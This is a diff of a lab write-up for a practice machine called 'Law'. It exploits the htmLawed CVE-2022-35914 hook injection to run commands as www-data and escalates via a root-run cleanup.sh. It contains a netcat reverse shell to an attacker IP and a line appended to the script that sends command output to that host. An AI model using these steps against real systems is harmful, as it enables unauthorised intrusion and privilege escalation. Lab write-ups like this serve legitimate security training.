@@ -3,7 +3,7 @@
 # 🐧Law🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.143.190
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 15:27 AEDT
 
@@ -17,12 +17,12 @@ found a way to exploit of github
 https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/
 
 in the setting the name of hook function put exec
-```
+```console
 hook: exec
 ```
 the put id in the input box  
 use burp suite to intercept the traffic   
-```
+```console
 POST /htmLawedTest.php HTTP/1.1
 Host: 192.168.143.190
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -41,15 +41,15 @@ Priority: u=0, i
 we got the output says the URL in not exist  
 becuase it redirect us to /htmLawedTest.php which is not exist  
 we delete the path
-```
+```console
 POST / HTTP/1.1
 ```
 forward the traffic and got the result
-```
+```console
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 put the reverse shell payload in the input section and process again
-```
+```console
 nc -c sh 192.168.45.201 80
 
 $ nc -lvnp 80
@@ -61,7 +61,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ## Privilege Escalation 
 
 there is a unusual file call cleanup.sh
-```
+```console
 www-data@law:/var/www$ ls -la
 total 20
 drwxr-xr-x  3 root     root     4096 Aug 25  2023 .
@@ -78,7 +78,7 @@ rm -rf /var/log/apache2/access.log
 it looks like a bash script   
 but we can access the log  
 it could possibly run by root
-```
+```console
 www-data@law:/var/www$ cat /var/log/apache2/error.log
 cat: /var/log/apache2/error.log: Permission denied
 www-data@law:/var/www$ cat /var/log/apache2/access.log
@@ -86,7 +86,7 @@ cat: /var/log/apache2/access.log: Permission denied
 ```
 to test it we ask the script to send us the id output  
 and it confirmed its running by root
-```
+```console
 www-data@law:/var/www$ echo 'id | nc 192.168.45.201 8083' >> cleanup.sh
 
 $ nc -lvnp 8083         
